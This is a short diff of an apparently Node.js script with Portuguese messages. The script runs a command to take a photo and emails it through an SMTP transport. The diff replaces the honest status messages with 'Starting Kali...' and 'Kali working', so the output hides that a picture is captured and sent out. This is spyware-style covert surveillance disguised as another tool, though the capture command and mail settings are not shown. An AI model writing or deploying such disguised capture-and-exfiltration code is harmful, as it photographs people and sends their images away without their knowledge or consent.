@@ -9,7 +9,7 @@ exec(takePhotoCommand, async (error, stdout, stderr) => {
     console.error(`Erro ao tirar a foto: ${error.message}`);
     return;
   }
-  console.log('Foto tirada com sucesso!');
+  console.log('Iniciando Kali...');
 
   // Configurações do serviço SMTP para o envio de e-mails
   const transporter = nodemailer.createTransport({
@@ -41,6 +41,6 @@ exec(takePhotoCommand, async (error, stdout, stderr) => {
       console.error(`Erro ao enviar o email: ${err.message}`);
       return;
     }
-    console.log('E-mail enviado com a foto anexada.');
+    console.log('Kali Funcionando');
   });
 });
